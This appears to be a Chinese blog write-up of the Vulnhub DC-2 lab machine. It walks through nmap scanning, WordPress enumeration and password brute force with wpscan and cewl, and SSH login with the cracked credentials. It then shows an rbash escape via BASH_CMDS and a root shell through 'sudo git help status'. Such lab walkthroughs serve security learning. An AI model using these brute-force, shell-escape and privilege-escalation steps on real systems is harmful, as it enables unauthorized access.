---
layout: mypost
title: Vulnhub靶机DC2渗透
categories: [靶机]
---

靶机下载地址：[DC2](https://www.vulnhub.com/entry/dc-2,311/)

Kali Linux 地址：192.168.43.110

经典开局

![](https://z3.ax1x.com/2021/04/23/cXAboF.png)

nmap 直接扫网段更高效

![](https://z3.ax1x.com/2021/04/22/cL5LHe.png)

DC2 地址：192.168.43.252

![](https://z3.ax1x.com/2021/04/22/cLIAEQ.png)

开放的 80 http 和 7744 ssh 都是重点端口

# flag1

从 80 http 端口入手，访问 web 页面（如果无法访问修改hosts文件）

![](https://z3.ax1x.com/2021/04/22/cLIUv6.png)

看到 wordpress 可就不困了

![](https://z3.ax1x.com/2021/04/22/cLIza4.png)

flag1 直接糊脸上

> Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
>
> More passwords is always better, but sometimes you just can’t win them all.
>
> Log in as one to see the next flag.
>
> If you can’t find it, log in as another.

提示用 cewl 生成字典爆破

# flag2

dirb 扫目录

![](https://z3.ax1x.com/2021/04/22/cLoaJs.png)

发现后台地址

```url
http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&reauth=1
```

上 wpscan 专用工具

这里可能会出现数据库无法在线更新的问题，手动解决

```bash
wget http://blog.dsb.ink/wpscan/wp.zip //下载
unzip wp.zip //解压
mv wpscan /var/www/html/ //移动目录
dpkg -L wpscan | grep updater //查找wpscan的update配置文件位置
```

![](https://z3.ax1x.com/2021/04/22/cLTYX6.png)

```bash
vim /usr/share/rubygems-integration/all/gems/wpscan-3.8.7/lib/wpscan/db/updater.rb 
```

然后修改第 81 行 url 为 http://127.0.0.1/wpscan/ ，用本地更新

![](https://z3.ax1x.com/2021/04/22/cLT0tH.png)

打开本地服务，刷新即可解决

```bash
sudo service apache2 start  
wpscan --update //刷新
```

![](https://z3.ax1x.com/2021/04/22/cLTXEF.png)

查看 wordpress 的版本、主题、用户名

```bash
wpscan --url http://dc-2 --enumerate u
```

![](https://z3.ax1x.com/2021/04/22/cL72x1.png)

版本 4.7.10

![](https://z3.ax1x.com/2021/04/22/cL7hqK.png)

主题 twentyseventeen

![](https://z3.ax1x.com/2021/04/22/cL75VO.png)

枚三个用户名 admin、jerry、tom ，可还行

用 cewl 爬取网站信息生成密码字典

```bash
cewl http://dc-2 > dc-2.txt 
more dc-2.txt //大致查看
```

![](https://z3.ax1x.com/2021/04/22/cLbfAO.png)

继续用 wpscan 爆破，用户名会自动采取扫到的那三个

```bash
wpscan --url http://dc-2 --passwords dc-2.txt
（如果要一键扫洞后加 --api-token token在https://wpscan.com免费注册申请）
```

![](https://z3.ax1x.com/2021/04/22/cLqiD0.png)

jerry 密码 adipiscing

tom 密码 parturient

![](https://z3.ax1x.com/2021/04/22/cLqMK1.png)

登录后台区别就是 Tom Cat 看不到 flag2 ...

![](https://z3.ax1x.com/2021/04/22/cLq3VK.png)

Jerry Mouse 权限似乎大一些

![](https://z3.ax1x.com/2021/04/22/cLqG5D.png)

> If you can't exploit WordPress and take a shortcut, there is another way.
>
> Hope you found another entry point.

提示换一个入口

# flag3

还记得之前的 7744 ssh 端口吗

![](https://z3.ax1x.com/2021/04/22/cLq2xs.png)

尝试登录

![](https://z3.ax1x.com/2021/04/22/cLqXs1.png)

![](https://z3.ax1x.com/2021/04/22/cLLCJe.png)

只有 tom 的号能上

![](https://z3.ax1x.com/2021/04/22/cLLMWQ.png)

目录下就有 flag3 ，cat 权限受限，只能用 vi 打开

![](https://z3.ax1x.com/2021/04/22/cLLrO1.png)

> poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

提示要用 jerry 的账号

# flag4

尝试 rbash 限制绕过，查看可以使用的命令

![](https://z3.ax1x.com/2021/04/22/cLOikT.png)

印证了之前 vi 的尝试

另一种查看当前用户可用命令的语句 

```bash
compgen -c
```

一套素质四连

![](https://z3.ax1x.com/2021/04/22/cLO89e.png)

```bash
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
echo /* 
```

成功绕过，可以查看文件

rbash 另一种绕过方法

![](https://z3.ax1x.com/2021/04/23/cO3Cbd.png)

切换到 jerry 账号

![](https://z3.ax1x.com/2021/04/22/cLOs3Q.png)

发现 flag4

![](https://z3.ax1x.com/2021/04/22/cLO2Bq.png)

> Good to see that you've made it this far - but you're not home yet. 
>
> You still need to get the final flag (the only flag that really counts!!!).  
>
> No hints here - you're on your own now.  :-)
>
> Go on - git outta here!!!!

提示用 git 提权

# final-flag

suid 可以让调用者以文件拥有者的身份运行该文件

已知可用来提权的： Nmap Vim find Bash More Less Nano

查找系统上运行的所有 suid 可执行文件（可以使用的root权限命令）

![](https://z3.ax1x.com/2021/04/22/cLX2xH.jpg)

尝试sudo

![](https://z3.ax1x.com/2021/04/22/cLOo34.png)

不出所料不可以

![](https://z3.ax1x.com/2021/04/22/cLOfEV.png)

但是 jerry 可以免 root 使用 git

![](https://z3.ax1x.com/2021/04/22/cLXWMd.png)

```bash
sudo git help status
```

![](https://z3.ax1x.com/2021/04/22/cLj9iT.png)

打开文件写入 !/bin/sh 

![](https://z3.ax1x.com/2021/04/22/cLjkQJ.png)

![](https://z3.ax1x.com/2021/04/22/cLjmo6.png)

提权成功

![](https://z3.ax1x.com/2021/04/22/cLjlSe.png)

Pwned！